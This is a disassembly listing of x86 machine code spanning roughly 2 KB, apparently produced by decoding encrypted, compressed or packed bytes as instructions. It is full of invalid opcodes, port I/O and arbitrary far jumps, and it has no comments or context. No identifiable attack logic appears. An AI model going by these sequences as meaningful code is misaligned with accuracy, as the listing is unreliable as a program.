  406041:	sub    al,0x95
  406043:	sbb    al,0xfc
  406045:	jp     0x40605d
  406047:	pop    es
  406048:	ins    DWORD PTR es:[edi],dx
  406049:	mov    ah,0xf5
  40604b:	dec    ebp
  40604c:	loope  0x40607e
  40604e:	fxch   st(1)
  406050:	and    eax,0x1c709dd6
  406055:	dec    ebx
  406056:	or     ebp,DWORD PTR [esi+ebp*2]
  406059:	popf   
  40605a:	fwait
  40605b:	into   
  40605c:	loop   0x40601e
  40605e:	push   ss
  40605f:	cmp    edx,DWORD PTR [esi]
  406061:	out    dx,al
  406062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406063:	out    dx,al
  406064:	mov    eax,0x8751ab7
  406069:	or     eax,edi
  40606b:	add    edi,DWORD PTR [ebp+0x8]
  40606e:	(bad)  
  40606f:	push   edi
  406070:	mov    ebp,DWORD PTR [ebp-0x7473c149]
  406076:	inc    ebp
  406077:	ret    
  406078:	pop    ds
  406079:	xor    ah,BYTE PTR [edx+esi*1+0x5]
  40607d:	jo     0x40602b
  40607f:	sub    DWORD PTR [edi-0x47f30a07],ecx
  406085:	out    0x41,eax
  406087:	out    dx,eax
  406088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406089:	sar    BYTE PTR [eax],1
  40608b:	or     BYTE PTR [edi],bl
  40608d:	arpl   WORD PTR [ecx],bx
  40608f:	or     dl,BYTE PTR [esi+0x13f6a2d3]
  406095:	jp     0x40603e
  406097:	repz (bad) 
  406099:	ja     0x4060bb
  40609b:	mov    esi,0x87daebb4
  4060a0:	mov    al,ds:0xdaa9025f
  4060a5:	stos   BYTE PTR es:[edi],al
  4060a6:	mov    esp,0x148acd48
  4060ab:	fadd   QWORD PTR [edi+0x274711fd]
  4060b1:	adc    BYTE PTR [eax-0x70],dl
  4060b4:	dec    ebx
  4060b5:	mov    ds:0xd4358acf,al
  4060ba:	sub    DWORD PTR [ecx+0x35],edi
  4060bd:	push   ecx
  4060be:	and    eax,0x48fdd751
  4060c3:	and    dh,BYTE PTR [edi+0xb2e7bf4]
  4060c9:	fmul   DWORD PTR [edx]
  4060cb:	jmp    FWORD PTR [ecx]
  4060cd:	ror    ch,1
  4060cf:	push   ss
  4060d0:	mov    eax,0x9311156c
  4060d5:	popf   
  4060d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060d7:	sbb    al,cl
  4060d9:	push   0xffffffb2
  4060db:	aaa    
  4060dc:	lahf   
  4060dd:	inc    eax
  4060de:	push   esp
  4060df:	push   edx
  4060e0:	mov    eax,ds:0x27645ef1
  4060e5:	retf   0x2350
  4060e8:	mul    DWORD PTR [edx-0x44]
  4060eb:	push   ds
  4060ec:	jno    0x40607d
  4060ee:	sti    
  4060ef:	in     al,0xb1
  4060f1:	jnp    0x40609b
  4060f3:	std    
  4060f4:	add    BYTE PTR [ebx+0x259c9a61],0xb1
  4060fb:	ds pop ebx
  4060fd:	inc    esp
  4060fe:	mov    dl,0x57
  406100:	add    al,0x72
  406102:	push   ecx
  406103:	xchg   DWORD PTR [ebx],edi
  406105:	mov    esp,0xd606dd34
  40610a:	repnz or eax,0x9e8f35fd
  406110:	xchg   ebp,eax
  406111:	adc    ebx,esi
  406113:	mov    esp,0x63dfbc82
  406118:	mov    al,ds:0x6d38151e
  40611d:	stc    
  40611e:	ds or  eax,0xe136cc88
  406124:	jnp    0x4060d2
  406126:	rcr    cl,cl
  406128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406129:	jp     0x406189
  40612b:	fisub  DWORD PTR [eax]
  40612d:	and    DWORD PTR [ecx-0x1740e9ae],0xffffffa0
  406134:	cdq    
  406135:	outs   dx,BYTE PTR ds:[esi]
  406136:	sub    bh,0xc2
  406139:	fwait
  40613a:	scas   al,BYTE PTR es:[edi]
  40613b:	ror    BYTE PTR [ebp-0x6fa3960f],cl
  406141:	ds jg  0x406178
  406144:	dec    ebp
  406145:	stc    
  406146:	rcl    DWORD PTR [ecx+0x55],1
  406149:	test   eax,0x39c538f8
  40614e:	adc    eax,0xeb5288c4
  406153:	(bad)  
  406154:	jno    0x406180
  406156:	enter  0xbdc8,0x26
  40615a:	xor    al,0x40
  40615c:	in     eax,dx
  40615d:	bswap  esp
  40615f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406160:	and    DWORD PTR [eax],ebp
  406162:	popf   
  406163:	aad    0xf2
  406165:	aas    
  406166:	inc    ecx
  406167:	xchg   esp,eax
  406168:	imul   eax,DWORD PTR ds:0x52c81eea,0xae2944ad
  406172:	(bad)  
  406173:	div    DWORD PTR [eax+esi*2-0x7ac410b9]
  40617a:	mov    edi,0xd0c8ae80
  40617f:	xor    DWORD PTR [esi],0x5df166ca
  406185:	ins    BYTE PTR es:[edi],dx
  406186:	jmp    0x42cbd18b
  40618b:	mov    ch,0x27
  40618d:	mov    esi,0xfd2ab1d6
  406192:	xor    ebx,DWORD PTR [ebx]
  406194:	adc    DWORD PTR [edi],esp
  406196:	mov    bl,0xc5
  406198:	adc    al,0xa3
  40619a:	call   0x698e:0x8b9d4228
  4061a1:	jo     0x406211
  4061a3:	fist   DWORD PTR [ecx]
  4061a5:	fisttp DWORD PTR [eax]
  4061a7:	adc    eax,0x45a5004f
  4061ac:	inc    esp
  4061ad:	lds    esi,FWORD PTR [edi+0x150c7939]
  4061b3:	and    al,0x96
  4061b5:	mul    edx
  4061b7:	clc    
  4061b8:	pop    esi
  4061b9:	mov    eax,ds:0xd72263b6
  4061be:	cmp    esp,DWORD PTR [esi-0x54]
  4061c1:	int    0x31
  4061c3:	lock popa 
  4061c5:	les    eax,FWORD PTR ds:0xce957154
  4061cb:	pop    esp
  4061cc:	jbe    0x4061f8
  4061ce:	cld    
  4061cf:	adc    DWORD PTR [bx+di],0xffffff9d
  4061d3:	adc    BYTE PTR [edi-0x16],al
  4061d6:	imul   esp,DWORD PTR [ebp+0x1ba3cc2e],0x1ad94c26
  4061e0:	fmul   QWORD PTR [edi+0x3f]
  4061e3:	jl     0x406194
  4061e5:	jno    0x406185
  4061e7:	sti    
  4061e8:	pushf  
  4061e9:	lahf   
  4061ea:	jge    0x406252
  4061ec:	jo     0x406185
  4061ee:	aad    0x8e
  4061f0:	test   eax,0x510bdc7a
  4061f5:	in     eax,dx
  4061f6:	mov    ds:0xa7bcc951,eax
  4061fb:	ror    BYTE PTR [edi+esi*2],cl
  4061fe:	in     eax,dx
  4061ff:	adc    ebx,ebp
  406201:	int3   
  406202:	or     eax,0x79d36f88
  406207:	iret   
  406208:	int    0x11
  40620a:	sbb    eax,0x6d7440ce
  40620f:	(bad)  
  406210:	aam    0x53
  406212:	stos   BYTE PTR es:[edi],al
  406213:	xlat   BYTE PTR ds:[ebx]
  406214:	(bad)  
  406215:	das    
  406216:	push   0x1d7f51a4
  40621b:	in     eax,dx
  40621c:	adc    eax,DWORD PTR [edi-0x15]
  40621f:	fstp   st(6)
  406221:	cmp    edi,DWORD PTR [esi+esi*8-0x2882ecef]
  406228:	in     eax,0x97
  40622a:	mov    bh,0xbc
  40622c:	xchg   edx,eax
  40622d:	int3   
  40622e:	das    
  40622f:	adc    bh,ch
  406231:	test   eax,0x2d731edd
  406236:	xor    BYTE PTR [esi],ch
  406238:	push   ecx
  406239:	jmp    0x77b2:0x20e9e86e
  406240:	bound  ebx,QWORD PTR [edi]
  406242:	test   al,0xa0
  406244:	pop    esp
  406245:	sbb    BYTE PTR [edi+0x5e0352e8],dh
  40624b:	(bad)  
  40624c:	aaa    
  40624d:	out    0x6f,eax
  40624f:	and    eax,0xb6c008c5
  406254:	jmp    0x28ae:0x27e63f9f
  40625b:	repnz mov al,0xbe
  40625e:	test   eax,0xafb90e63
  406263:	mov    dl,0x83
  406265:	mov    cl,0x1
  406267:	cmp    BYTE PTR [esi+0x1ed82069],dh
  40626d:	cmp    esp,DWORD PTR [esi+0x49276292]
  406273:	adc    dl,ch
  406275:	dec    edi
  406276:	mov    edx,0x402da837
  40627b:	in     al,dx
  40627c:	cmp    ebp,DWORD PTR [ebx+0x28]
  40627f:	add    ah,BYTE PTR [ebp+ebx*2-0x186281dc]
  406286:	push   0xffffffe0
  406288:	mov    ecx,0x25e27aa9
  40628d:	or     DWORD PTR [esi-0x54],ebx
  406290:	sub    BYTE PTR [edx-0xf916140],cl
  406296:	mov    bl,0x82
  406298:	inc    ebp
  406299:	jg     0x4062b0
  40629b:	mov    ah,0xa3
  40629d:	xor    DWORD PTR [esp+edi*2-0x39],esi
  4062a1:	loopne 0x4062e4
  4062a3:	push   0xf4b5fc98
  4062a8:	in     eax,0x68
  4062aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062ab:	mov    al,0x70
  4062ad:	cli    
  4062ae:	jg     0x40626e
  4062b0:	gs cmp eax,0x1a968040
  4062b6:	mov    edx,0xbc869507
  4062bb:	lods   eax,DWORD PTR ds:[esi]
  4062bc:	fisubr DWORD PTR [ecx]
  4062be:	test   al,0x17
  4062c0:	inc    esi
  4062c1:	cmp    BYTE PTR [edi-0x19],dh
  4062c4:	xor    ebp,edx
  4062c6:	fld    DWORD PTR [edx]
  4062c8:	xor    bh,BYTE PTR [ebx]
  4062ca:	ror    BYTE PTR [edx-0x69],cl
  4062cd:	inc    eax
  4062ce:	icebp  
  4062cf:	sbb    bl,BYTE PTR [eax]
  4062d1:	dec    ecx
  4062d2:	cdq    
  4062d3:	mov    DWORD PTR [ebx+0x152df137],esi
  4062d9:	popa   
  4062da:	jo     0x4062e0
  4062dc:	adc    al,0x8
  4062de:	xor    al,0x85
  4062e0:	push   eax
  4062e1:	xchg   edi,eax
  4062e2:	or     DWORD PTR [ecx],0x5a4b879d
  4062e8:	mov    eax,edi
  4062ea:	sub    eax,esp
  4062ec:	jae    0x40633d
  4062ee:	push   eax
  4062ef:	inc    edi
  4062f0:	xor    BYTE PTR [ebx+eax*1],dh
  4062f3:	xor    eax,0x97f0f1d0
  4062f8:	dec    ebp
  4062f9:	xor    BYTE PTR [edx-0x15],bl
  4062fc:	sub    bl,BYTE PTR [esi-0x7c]
  4062ff:	inc    esi
  406300:	pop    esi
  406301:	inc    edx
  406302:	(bad)  
  406303:	mov    edx,0xf98b663c
  406308:	stc    
  406309:	repnz xor BYTE PTR [esi],cl
  40630c:	sub    DWORD PTR [ebx],esi
  40630e:	aas    
  40630f:	xor    al,0x55
  406311:	ss test eax,0xf7610f5
  406317:	gs fcmovne st,st(4)
  40631a:	xchg   ecx,eax
  40631b:	xchg   edi,eax
  40631c:	paddd  mm0,mm7
  40631f:	and    edx,DWORD PTR [ebp-0x1c19665a]
  406325:	scas   al,BYTE PTR es:[edi]
  406326:	inc    esi
  406327:	dec    esi
  406328:	ja     0x40638c
  40632a:	inc    edi
  40632b:	popa   
  40632c:	sbb    edx,DWORD PTR [ebx]
  40632e:	push   es
  40632f:	(bad)  
  406330:	clc    
  406331:	or     eax,0xaf67e99c
  406336:	xor    eax,0x810ca0ba
  40633b:	stos   DWORD PTR es:[edi],eax
  40633c:	push   0x23
  40633e:	outs   dx,DWORD PTR ds:[esi]
  40633f:	add    al,0xd
  406341:	mov    esp,cs
  406343:	mov    al,0xd9
  406345:	mov    esp,0x48bfd0e5
  40634a:	test   BYTE PTR [eax+ecx*1],al
  40634d:	fcom   DWORD PTR [ebx+ecx*8]
  406350:	data16 out dx,al
  406352:	or     ch,BYTE PTR [esi]
  406354:	cs xchg esp,eax
  406356:	fwait
  406357:	xchg   DWORD PTR [ecx+edx*1-0x44],edi
  40635b:	adc    DWORD PTR [esp+eiz*2+0x3a7e3de8],edx
  406362:	fcomp  DWORD PTR [esi]
  406364:	cs xchg esp,eax
  406366:	aad    0x9c
  406368:	fs leave 
  40636a:	adc    al,BYTE PTR [ebx]
  40636c:	cmp    al,BYTE PTR [ebx-0x2da6a67]
  406372:	mov    esp,0xc969d872
  406377:	sbb    al,0x9f
  406379:	cmp    dh,dh
  40637b:	push   ecx
  40637c:	xchg   DWORD PTR [ecx],esi
  40637e:	push   es
  40637f:	(bad)  
  406380:	sbb    BYTE PTR [edi-0x20a98351],bh
  406386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406387:	push   ss
  406388:	fs popf 
  40638a:	loopne 0x4063b8
  40638c:	dec    ecx
  40638d:	push   cs
  40638e:	mov    al,ds:0x98c8d4
  406393:	loope  0x406405
  406395:	stos   BYTE PTR es:[edi],al
  406396:	dec    esp
  406397:	or     eax,0xc530abf7
  40639c:	xchg   BYTE PTR [ebp-0x67],ch
  40639f:	fdiv   QWORD PTR [esi-0x3b3e5339]
  4063a5:	retf   0xd07b
  4063a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063a9:	hlt    
  4063aa:	daa    
  4063ab:	test   al,0x86
  4063ad:	inc    edi
  4063ae:	and    BYTE PTR [esi-0x3297bf00],dh
  4063b4:	sub    ecx,ecx
  4063b6:	cld    
  4063b7:	pop    es
  4063b8:	add    DWORD PTR [ecx+edx*8+0x38],eax
  4063bc:	add    ebp,DWORD PTR [edi+0x7d37bffb]
  4063c2:	xchg   esi,eax
  4063c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063c4:	xchg   edx,eax
  4063c5:	pop    edx
  4063c6:	outs   dx,DWORD PTR ds:[esi]
  4063c7:	adc    edx,DWORD PTR [ebp-0x48c02458]
  4063cd:	sbb    BYTE PTR [esi],dl
  4063cf:	je     0x406352
  4063d1:	sar    BYTE PTR [ebp+eax*8-0x6f],1
  4063d5:	mov    eax,0xd43514c8
  4063da:	xchg   ebp,eax
  4063db:	mov    eax,0x96bd4c8c
  4063e0:	lock cwde 
  4063e2:	lea    ebx,[ecx+0x5ccc6f73]
  4063e8:	pop    ebp
  4063e9:	jmp    0x4063f2
  4063eb:	dec    edx
  4063ec:	dec    ecx
  4063ed:	sar    ah,0x8f
  4063f0:	div    DWORD PTR [edx]
  4063f2:	sub    dl,BYTE PTR [edx+0x4e]
  4063f5:	jmp    0x9353:0x85319588
  4063fc:	cmp    eax,0x45866dd0
  406401:	ret    0xa0ab
  406404:	mov    gs,ebx
  406406:	jne    0x4063dd
  406408:	inc    edi
  406409:	xchg   esi,edi
  40640b:	inc    esi
  40640c:	push   ds
  40640d:	icebp  
  40640e:	pop    ebp
  40640f:	stos   BYTE PTR es:[edi],al
  406410:	dec    edi
  406411:	sub    al,0xff
  406413:	fst    QWORD PTR [eax]
  406415:	cmp    al,0x20
  406417:	scas   al,BYTE PTR es:[edi]
  406418:	pop    esp
  406419:	inc    ecx
  40641a:	test   DWORD PTR [esp+edi*4+0x31],ebx
  40641e:	addr16 enter 0xb7f1,0xe7
  406423:	int    0x10
  406425:	inc    ebx
  406426:	fucomi st,st(3)
  406428:	and    DWORD PTR [eax+0x5481e1bc],esi
  40642e:	neg    BYTE PTR ds:0xac680719
  406434:	or     ebx,DWORD PTR [ebp-0x3e51e415]
  40643a:	lock leave 
  40643c:	add    al,0x2c
  40643e:	push   edi
  40643f:	or     esp,ebx
  406441:	pushf  
  406442:	pop    ebx
  406443:	xor    BYTE PTR [ebx+edi*1],cl
  406446:	push   0x33
  406448:	jl     0x40643b
  40644a:	lods   eax,DWORD PTR ds:[esi]
  40644b:	daa    
  40644c:	sbb    BYTE PTR [edi+edi*2],cl
  40644f:	(bad)  
  406450:	xchg   edi,eax
  406451:	add    edx,ebx
  406453:	sub    ecx,eax
  406455:	inc    ecx
  406456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406457:	xchg   esi,eax
  406458:	ret    0x9308
  40645b:	retf   
  40645c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40645d:	mov    ebp,0x829df0ce
  406462:	mov    edi,0xf4cdd951
  406467:	aad    0x16
  406469:	sar    DWORD PTR [edi+0x50777e5b],cl
  40646f:	inc    esp
  406470:	dec    ebp
  406471:	ins    BYTE PTR es:[edi],dx
  406472:	and    esp,DWORD PTR [ecx]
  406474:	in     al,dx
  406475:	inc    eax
  406476:	mov    ch,0xa2
  406478:	or     BYTE PTR [ebx+0x3e106186],0xd9
  40647f:	cmc    
  406480:	rcr    BYTE PTR [ebp-0x53208ad9],0xa
  406487:	and    eax,0x1ed1aef3
  40648c:	outs   dx,DWORD PTR ds:[esi]
  40648d:	(bad)  
  40648e:	leave  
  40648f:	push   cs
  406490:	inc    ecx
  406491:	and    DWORD PTR [edi+0x5c],esi
  406494:	(bad)  
  406495:	call   0xb844:0x52048741
  40649c:	push   es
  40649d:	das    
  40649e:	lock cmp esp,0xffffffa8
  4064a2:	inc    esi
  4064a3:	call   DWORD PTR [eax+0x1d]
  4064a6:	outs   dx,BYTE PTR ds:[esi]
  4064a7:	cli    
  4064a8:	test   DWORD PTR [esi+eax*2-0x66],esi
  4064ac:	jo     0x406505
  4064ae:	test   BYTE PTR [esi+0x49],bl
  4064b1:	in     al,dx
  4064b2:	jecxz  0x4064b8
  4064b4:	jmp    0xe7cd77ac
  4064b9:	and    eax,0xea41f782
  4064be:	xor    eax,0x8ef34580
  4064c3:	mov    BYTE PTR [ebp-0x23],dh
  4064c6:	in     al,0xff
  4064c8:	stos   BYTE PTR es:[edi],al
  4064c9:	fsubr  DWORD PTR [ecx+eiz*4+0xa]
  4064cd:	sub    edi,DWORD PTR [edx+0x5db4e045]
  4064d3:	les    ebp,FWORD PTR [edx-0x56207b92]
  4064d9:	shl    BYTE PTR [edi+0x4c],0xe6
  4064dd:	shl    BYTE PTR [eax-0x59],0xcd
  4064e1:	cwde   
  4064e2:	or     ch,BYTE PTR [esi]
  4064e4:	inc    ecx
  4064e5:	test   al,0x3
  4064e7:	icebp  
  4064e8:	rcr    ebx,cl
  4064ea:	loop   0x406501
  4064ec:	in     eax,0x88
  4064ee:	mov    bl,0x69
  4064f0:	mov    dh,0x1c
  4064f2:	stc    
  4064f3:	(bad)  
  4064f4:	in     al,0xe8
  4064f6:	ss stos DWORD PTR es:[edi],eax
  4064f8:	push   esi
  4064f9:	mov    al,0xfa
  4064fb:	neg    DWORD PTR [edx-0x6]
  4064fe:	aaa    
  4064ff:	xor    al,0x67
  406501:	(bad)  
  406502:	cli    
  406503:	bound  ecx,QWORD PTR [ecx]
  406505:	inc    esp
  406506:	or     BYTE PTR fs:[eax-0x1c25e58f],ch
  40650d:	sti    
  40650e:	jns    0x4064f8
  406510:	sub    al,0x3
  406512:	push   es
  406513:	mov    eax,ds:0x8b17a8e5
  406518:	ins    DWORD PTR es:[edi],dx
  406519:	jo     0x4064b8
  40651b:	and    eax,0x421fb8ff
  406520:	jp     0x4064f5
  406522:	das    
  406523:	retf   0xa2c0
  406526:	in     al,0x4
  406528:	dec    ebx
  406529:	push   DWORD PTR [ecx+edx*1]
  40652c:	popf   
  40652d:	rol    ah,cl
  40652f:	int    0x40
  406531:	sar    DWORD PTR [ebx+edi*2-0x3a39a575],0x1f
  406539:	mul    DWORD PTR [eax-0x749b4c69]
  40653f:	arpl   WORD PTR [esi],bp
  406541:	jmp    0x84f46f63
  406546:	sbb    al,0x93
  406548:	sbb    BYTE PTR [edx+0x66074c63],0xf
  40654f:	std    
  406550:	test   DWORD PTR [ebx+0x339d49ca],eax
  406556:	xor    eax,0xae0e1433
  40655b:	or     BYTE PTR [eax+0x143739ac],ah
  406561:	push   0x5b
  406563:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406564:	push   ecx
  406565:	retf   0x6d26
  406568:	iret   
  406569:	fisttp QWORD PTR [edx-0xa97a6df]
  40656f:	call   0x33ffccf
  406574:	or     eax,0xbcc5e66d
  406579:	push   ss
  40657a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40657b:	and    ah,bh
  40657d:	mov    esi,edx
  40657f:	add    esp,ecx
  406581:	mov    al,ds:0xfa5e8a5b
  406586:	cli    
  406587:	mov    cl,0x6f
  406589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40658a:	and    ebx,0x43
  40658d:	cmp    ah,BYTE PTR [edi-0x53a7f7cf]
  406593:	in     al,dx
  406594:	xchg   bl,dh
  406596:	inc    esi
  406597:	mov    eax,ds:0xa1571cd1
  40659c:	jae    0x406613
  40659e:	jb     0x406553
  4065a0:	stos   BYTE PTR es:[edi],al
  4065a1:	pop    esi
  4065a2:	sub    BYTE PTR fs:[ecx+0x614a265a],0x3c
  4065aa:	adc    eax,0x2297190d
  4065af:	pushf  
  4065b0:	mov    ecx,0xf4ba5450
  4065b5:	arpl   WORD PTR [eax+esi*8],ax
  4065b8:	and    eax,0x4f5ed8d1
  4065bd:	ficom  WORD PTR [ebx-0x8]
  4065c0:	xchg   ebx,eax
  4065c1:	mov    ah,0x29
  4065c3:	or     BYTE PTR [ebx+0x48],0xd4
  4065c7:	mov    cl,bl
  4065c9:	dec    esi
  4065ca:	inc    ebp
  4065cb:	aam    0x8b
  4065cd:	xchg   edx,eax
  4065ce:	std    
  4065cf:	ins    BYTE PTR es:[edi],dx
  4065d0:	fcom   QWORD PTR [edi+eiz*1-0x2]
  4065d4:	hlt    
  4065d5:	js     0x406613
  4065d7:	cmp    DWORD PTR [ebx-0x648c12fd],ebp
  4065dd:	daa    
  4065de:	leave  
  4065df:	inc    ebx
  4065e0:	mov    bh,0xb0
  4065e2:	cld    
  4065e3:	mov    bl,0xd6
  4065e5:	dec    esi
  4065e6:	inc    esp
  4065e7:	and    eax,0x7ba646a5
  4065ec:	inc    esp
  4065ed:	leave  
  4065ee:	pop    es
  4065ef:	sub    cl,cl
  4065f1:	jmp    FWORD PTR [ecx+eax*1-0x50]
  4065f5:	and    DWORD PTR [eax],edx
  4065f7:	dec    esi
  4065f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065f9:	sahf   
  4065fa:	dec    esi
  4065fb:	je     0x4065f4
  4065fd:	mov    edx,0x414f6e12
  406602:	leave  
  406603:	push   eax
  406604:	jmp    0x9764:0x318e959b
  40660b:	sar    DWORD PTR [esi-0x3d02470e],cl
  406611:	and    DWORD PTR [edx],eax
  406613:	int3   
  406614:	xchg   ecx,eax
  406615:	ret    
  406616:	or     BYTE PTR [ebx+0x455e23aa],0x81
  40661d:	jnp    0x40666e
  40661f:	gs add eax,0xe2f32779
  406625:	sub    DWORD PTR [esi-0xc],edi
  406628:	in     eax,0xe5
  40662a:	sub    BYTE PTR [edi],ch
  40662c:	or     dl,BYTE PTR ds:0xd082e31
  406632:	pop    esi
  406633:	jns    0x40664a
  406635:	mov    WORD PTR [ecx-0x21],cs
  406638:	daa    
  406639:	test   DWORD PTR [esi],ebp
  40663b:	mov    ebx,0x2414b1ca
  406640:	ds cmp al,0x21
  406643:	or     al,0xcc
  406645:	inc    esp
  406646:	enter  0xafc7,0x5f
  40664a:	xchg   DWORD PTR [edi-0x4eb97e79],ebx
  406650:	inc    ecx
  406651:	sbb    ecx,ebp
  406653:	sub    al,0x38
  406655:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406656:	shl    DWORD PTR [edx],0xa4
  406659:	mov    DWORD PTR [edx-0x17ab93c1],ebx
  40665f:	retf   0xdb5f
  406662:	inc    ecx
  406663:	(bad)  
  406664:	rcl    DWORD PTR [edi],cl
  406666:	pop    es
  406667:	sub    eax,0x39d987db
  40666c:	inc    edi
  40666d:	jbe    0x406607
  40666f:	ret    0x9df6
  406672:	sbb    ecx,ebx
  406674:	fistp  QWORD PTR [edx]
  406676:	sbb    cl,cl
  406678:	cmp    BYTE PTR [ecx+0xc],0xc5
  40667c:	inc    ecx
  40667d:	loopne 0x4066f1
  40667f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406680:	xor    BYTE PTR [edx+0x4],dl
  406683:	mov    esi,0x5be47e3f
  406688:	mov    ds:0xc1efddbd,eax
  40668d:	and    BYTE PTR [ecx+ebp*4+0x3c16a991],cl
  406694:	cmp    al,0x77
  406696:	sbb    DWORD PTR [esi+0x4],ebx
  406699:	dec    ebx
  40669a:	push   esp
  40669b:	fadd   QWORD PTR [edx+0x59]
  40669e:	add    eax,0x7aa99bd5
  4066a3:	xchg   edi,eax
  4066a4:	pop    edx
  4066a5:	repz sub BYTE PTR [ecx],bh
  4066a8:	cmc    
  4066a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066aa:	scas   al,BYTE PTR es:[edi]
  4066ab:	or     eax,0x1635de34
  4066b0:	pop    edi
  4066b1:	fistp  WORD PTR [ecx-0x7]
  4066b4:	into   
  4066b5:	cmp    al,0x8f
  4066b7:	aad    0xb3
  4066b9:	loopne 0x40664e
  4066bb:	imul   ebp,DWORD PTR [edx+0x21],0x8eb1f086
  4066c2:	pusha  
  4066c3:	std    
  4066c4:	jbe    0x4066cf
  4066c6:	(bad)
  4066c9:	repnz adc cl,bh
  4066cc:	ins    BYTE PTR es:[edi],dx
  4066cd:	mul    BYTE PTR ds:0x9f0486dd
  4066d3:	sbb    ebp,ebx
  4066d5:	aas    
  4066d6:	push   0xbe1dc802
  4066db:	push   es
  4066dc:	dec    esi
  4066dd:	and    al,0xd2
  4066df:	cmp    eax,0x40a25091
  4066e4:	and    edi,DWORD PTR [ebx-0x59332bf9]
  4066ea:	stos   DWORD PTR es:[edi],eax
  4066eb:	sbb    cl,cl
  4066ed:	fnstenv [edi+0x112ddc5]
  4066f3:	call   0xd39cf1fd
  4066f8:	pusha  
  4066f9:	inc    ebp
  4066fa:	out    0x19,al
  4066fc:	adc    BYTE PTR [edx+edi*1-0x4e],al
  406700:	xchg   esi,eax
  406701:	pop    ds
  406702:	ror    ebp,cl
  406704:	mov    ecx,0xed7923c0
  406709:	shl    BYTE PTR [edx-0x27],1
  40670c:	and    DWORD PTR [ebx],ebx
  40670e:	repz (bad) 
  406710:	pop    esi
  406711:	cdq    
  406712:	lahf   
  406713:	in     al,dx
  406714:	dec    edi
  406715:	add    esi,eax
  406717:	mov    bl,BYTE PTR [ebx-0x6739a2b2]
  40671d:	loope  0x40677e
  40671f:	jno    0x406766
  406721:	xor    dh,dl
  406723:	cdq    
  406724:	xchg   BYTE PTR [esi+edi*8+0x4daa4c6],bh
  40672b:	aaa    
  40672c:	stc    
  40672d:	mov    DWORD PTR [eax-0x2b7ca57a],eax
  406733:	(bad)  
  406734:	cmp    BYTE PTR [esi+edx*4+0x63],al
  406738:	hlt    
  406739:	add    al,0xef
  40673b:	add    eax,eax
  40673d:	or     ah,cl
  40673f:	lds    sp,DWORD PTR [eax]
  406742:	or     al,0x15
  406744:	(bad)  
  406745:	daa    
  406746:	push   esp
  406747:	lahf   
  406748:	repz repz jae 0x4066f5
  40674c:	xchg   ebp,eax
  40674d:	xor    BYTE PTR [ecx],bh
  40674f:	dec    edi
  406750:	and    bh,ah
  406752:	mov    bl,0xd2
  406754:	(bad)  
  406755:	cmp    eax,0x14ced410
  40675a:	jg     0x40674b
  40675c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40675d:	cmp    al,0x5e
  40675f:	cwde   
  406760:	mov    dl,0x6c
  406762:	xchg   DWORD PTR [eax],ecx
  406764:	in     al,0x5b
  406766:	push   esi
  406767:	mov    ds,WORD PTR [ebx+0x1e]
  40676a:	hlt    
  40676b:	dec    esp
  40676c:	icebp  
  40676d:	jne    0x4067b5
  40676f:	add    bl,BYTE PTR [ecx]
  406771:	rol    BYTE PTR [eax+0x71fc5f09],cl
  406777:	je     0x40671c
  406779:	stos   DWORD PTR es:[edi],eax
  40677a:	nop
  40677b:	loope  0x406724
  40677d:	out    0xd4,eax
  40677f:	xlat   BYTE PTR ds:[ebx]
  406780:	lods   eax,DWORD PTR ds:[esi]
  406781:	cmp    eax,0x6e5b8ec9
  406786:	in     eax,0x6e
  406788:	(bad)  
  406789:	push   esp
  40678a:	lods   eax,DWORD PTR ds:[esi]
  40678b:	jbe    0x4067ea
  40678d:	out    dx,eax
  40678e:	mov    al,ds:0x499bf435
  406793:	adc    bh,ch
  406795:	ficomp WORD PTR [edx+edx*1-0x63]
  406799:	jns    0x4067d8
  40679b:	out    0x77,al
  40679d:	pop    ecx
  40679e:	inc    eax
  40679f:	out    0xd7,eax
  4067a1:	add    DWORD PTR [ebx-0x4800821b],edx
  4067a7:	cmp    al,0xe1
  4067a9:	and    DWORD PTR [eax*2-0x449684e],ebx
  4067b0:	mov    bh,al
  4067b2:	sahf   
  4067b3:	mov    edi,?
  4067b5:	clc    
  4067b6:	scas   al,BYTE PTR es:[edi]
  4067b7:	jae    0x40674b
  4067b9:	pop    esi
  4067ba:	ret    0x6598
  4067bd:	push   cs
  4067be:	stos   BYTE PTR es:[edi],al
  4067bf:	arpl   WORD PTR [ecx],cx
  4067c1:	lods   al,BYTE PTR ds:[esi]
  4067c2:	xor    DWORD PTR [esi-0x3646276e],edx
  4067c8:	ins    BYTE PTR es:[edi],dx
  4067c9:	bound  ecx,QWORD PTR [edx]
  4067cb:	mov    cl,0x6
  4067cd:	mov    esp,0x39322067
  4067d2:	sub    DWORD PTR [ecx],eax
  4067d4:	push   edi
  4067d5:	and    eax,0xcd9ef66c
  4067da:	add    DWORD PTR [eax+0x3e91bdf],ebx
  4067e0:	jg     0x40678d
  4067e2:	push   cs
  4067e3:	rcr    DWORD PTR [ebx-0xf6feaf6],1
  4067e9:	test   eax,0x520fec9c
  4067ee:	fcomp  QWORD PTR [eax+0x7726560e]
  4067f4:	aaa    
  4067f5:	cmp    DWORD PTR [ebx],ecx
  4067f7:	pop    edx
  4067f8:	and    DWORD PTR [edi-0x2ad0d10f],ebp
  4067fe:	push   es
  4067ff:	inc    ebp
  406800:	out    0xdd,al
  406802:	loopne 0x4067f0
  406804:	sbb    bl,BYTE PTR [ebx]
  406806:	and    bl,dh
  406808:	jmp    0x4067fd
